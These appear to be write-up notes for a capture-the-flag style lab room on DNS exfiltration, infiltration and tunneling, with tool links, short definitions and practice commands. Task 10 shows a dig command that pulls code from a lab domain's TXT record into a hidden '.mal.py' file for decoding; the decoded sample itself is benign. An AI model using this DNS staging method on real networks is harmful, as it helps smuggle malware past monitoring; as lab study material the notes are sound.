# Room
https://tryhackme.com/room/dnsmanipulation

# Task 1 - Intro
Examine DNS exfiltration and infiltration

# Task 2 - Installation
Tools used for this room
*  https://github.com/kleosdc/dns-exfil-infil
*  https://github.com/yarrick/iodine
*  https://www.wireshark.org/download.html

# Task 3 - Custom Public DNS Server
Walkthrough from STÖK
* https://www.youtube.com/watch?v=p8wbebEgtDk

# Task 4 - What is DNS?
DNS - Domain Name System - resolves domain names with IP addresses.  DNS servers are distributed around the world and translate something.com into an IP address.  DNS root name servers sit at the top of the DNS hierarchy.  Below the root servers are the TLD servers.  Below them are the actual domain servers

Resources
* https://www.cloudflare.com/learning/dns/glossary/dns-root-server/
* https://www.cloudflare.com/learning/dns/glossary/dns-root-server/
* https://www.cloudflare.com/learning/dns/glossary/dns-zone/
* https://www.iana.org/domains/root/servers
* https://www.cloudflare.com/learning/dns/dns-records/

# Task 5 - What is DNS Exfiltration?
DNS Exfiltration is a cyberattack via DNS with manual and automatted attacks.  Data exfiltration through DNS allows an attacker to transfer a large volume of data that looks like normal DNS traffic.

# Task 6 - DNS Exfiltration - Demo
Demo resources
* https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt
* https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py
* https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py

# Task 7 - DNS Exfiltration - Practice
SSH to the practice VM and run the commands

tshark
```
tshark -r [filename].pcap -T fields -e dns.qry.name
```

# Task 8 - What is DNS Infiltration
Infiltration defines the process where malicious code is ran to manipulate DNS servers, primarily used for dropping or malware staging, TXT records are usually used to infiltrate data into a network

# Task 9 - DNS Infiltration - Demo
Resources
* https://github.com/kleosdc/dns-exfil-infil

# Task 10 - DNS Infiltration - Practice
SSH to the practice VM and run the commands

grab TXT record
```
dig +short code.badbaddoma.in TXT | sed -e 's/\"//g' > .mal.py
```
run decoder
```
python3 ~/dns-exfil-infil/packetySimple.py
```
cat decoded output
```
cat .mal.py
import os; print(os.uname()[2])
```
grab flag
```
python -c 'import os; print(os.uname()[2])'
```

# Task 11 - DNS Tunneling
DNS is rarely monitored and can be used to tunnel other traffic

Tools
* https://code.kryo.se/iodine/

# Task 12 - End